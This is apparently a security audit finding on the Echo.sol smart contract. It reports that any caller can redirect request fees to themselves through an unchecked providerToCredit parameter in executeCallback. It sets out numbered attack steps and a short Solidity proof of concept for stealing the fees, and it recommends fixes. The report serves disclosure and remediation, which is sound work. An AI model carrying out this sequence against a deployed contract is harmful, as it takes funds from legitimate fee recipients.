### Title
Arbitrary `providerToCredit` in `executeCallback` Allows Any Caller to Redirect and Steal Provider Fees - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

### Summary

`Echo.executeCallback` is callable by anyone and accepts a fully attacker-controlled `providerToCredit` address. After the exclusivity period expires, any caller can pass their own registered address as `providerToCredit`, causing the entire request fee to be credited to an arbitrary account. A registered attacker can then withdraw those fees, stealing them from the legitimate assigned provider.

### Finding Description

`executeCallback` in `Echo.sol` accepts `providerToCredit` as a caller-supplied parameter with no validation that it matches the request's assigned provider (`req.provider`), and no check that it is even a registered provider:

```solidity
function executeCallback(
    address providerToCredit,   // <-- fully attacker-controlled
    uint64 sequenceNumber,
    bytes[] calldata updateData,
    bytes32[] calldata priceIds
) external payable override {
    Request storage req = findActiveRequest(sequenceNumber);

    if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
        require(
            providerToCredit == req.provider,
            "Only assigned provider during exclusivity period"
        );
    }
    // ... price validation ...
    _state.providers[providerToCredit].accruedFeesInWei += SafeCast
        .toUint128((req.fee + msg.value) - pythFee);
``` [1](#0-0) 

The exclusivity check only enforces `providerToCredit == req.provider` during the exclusivity window. Once that window closes, the check is entirely absent. [2](#0-1) 

The fee credit line writes to `_state.providers[providerToCredit].accruedFeesInWei` with no `isRegistered` guard, meaning any address — including one the attacker just registered — can receive the fee. [3](#0-2) 

The `withdrawAsFeeManager` path allows a provider to designate themselves as their own fee manager and then withdraw accrued fees: [4](#0-3) 

`registerProvider` is open to any address with no vetting: [5](#0-4) 

### Impact Explanation

An attacker can steal 100% of the fee (`req.fee`) that was paid by the requester and intended for the legitimate assigned provider. The legitimate provider receives nothing for fulfilling the request. This is a direct, permanent theft of funds from the Echo fee accounting system. Every pending request whose exclusivity period has elapsed is vulnerable simultaneously.

### Likelihood Explanation

The attack requires no privileged access. Any EOA can:
1. Call `registerProvider(0, 0, 0)` — permissionless, no cost.
2. Call `setFeeManager(self)` — permissionless.
3. Wait for any request's exclusivity period (`exclusivityPeriodSeconds`, default 15 seconds) to expire.
4. Call `executeCallback(self, sequenceNumber, validUpdateData, priceIds)` with valid Pyth update data.
5. Call `withdrawAsFeeManager(self, amount)` to drain the credited fees.

The exclusivity period is only 15 seconds by default, so the window is extremely short. Any attacker monitoring the mempool can front-run the legitimate provider's fulfillment transaction after the window expires, or simply race to submit first.

### Recommendation

1. **Validate `providerToCredit` against `req.provider`** unconditionally, or at minimum require that `providerToCredit` is a registered provider (`_state.providers[providerToCredit].isRegistered`).
2. After the exclusivity period, if open fulfillment is intended, still restrict `providerToCredit` to registered providers only, so fees cannot be redirected to arbitrary attacker-controlled addresses.
3. Consider removing the `providerToCredit` parameter entirely and always crediting `req.provider` (or `msg.sender` if open fulfillment is desired, with a registered-provider check on `msg.sender`).

### Proof of Concept

```solidity
// Attacker setup (one-time, permissionless)
echo.registerProvider(0, 0, 0);                  // step 1: register as provider
echo.setFeeManager(attacker);                     // step 2: set self as fee manager

// --- legitimate user creates a request ---
// uint64 seq = echo.requestPriceUpdatesWithCallback{value: fee}(
//     legitimateProvider, publishTime, priceIds, gasLimit
// );

// After exclusivityPeriodSeconds (15s default) elapses:
// step 3: attacker calls executeCallback with their own address as providerToCredit
echo.executeCallback(
    attacker,          // providerToCredit = attacker's registered address
    seq,
    validUpdateData,   // valid Pyth price update data for the requested priceIds/publishTime
    priceIds
);

// step 4: attacker withdraws the stolen fee
uint128 stolen = echo.getProviderInfo(attacker).accruedFeesInWei;
echo.withdrawAsFeeManager(attacker, stolen);
// attacker now holds the fee that was meant for legitimateProvider
```

The `req.fee` (paid by the requester, intended for `req.provider`) is fully transferred to the attacker. The legitimate provider receives zero compensation for the request they were assigned.

### Citations

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L105-121)
```text
    function executeCallback(
        address providerToCredit,
        uint64 sequenceNumber,
        bytes[] calldata updateData,
        bytes32[] calldata priceIds
    ) external payable override {
        Request storage req = findActiveRequest(sequenceNumber);

        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L161-162)
```text
        _state.providers[providerToCredit].accruedFeesInWei += SafeCast
            .toUint128((req.fee + msg.value) - pythFee);
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L360-379)
```text
    function withdrawAsFeeManager(
        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
    }
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L381-393)
```text
    function registerProvider(
        uint96 baseFeeInWei,
        uint96 feePerFeedInWei,
        uint96 feePerGasInWei
    ) external override {
        ProviderInfo storage provider = _state.providers[msg.sender];
        require(!provider.isRegistered, "Provider already registered");
        provider.baseFeeInWei = baseFeeInWei;
        provider.feePerFeedInWei = feePerFeedInWei;
        provider.feePerGasInWei = feePerGasInWei;
        provider.isRegistered = true;
        emit ProviderRegistered(msg.sender, feePerGasInWei);
    }
```
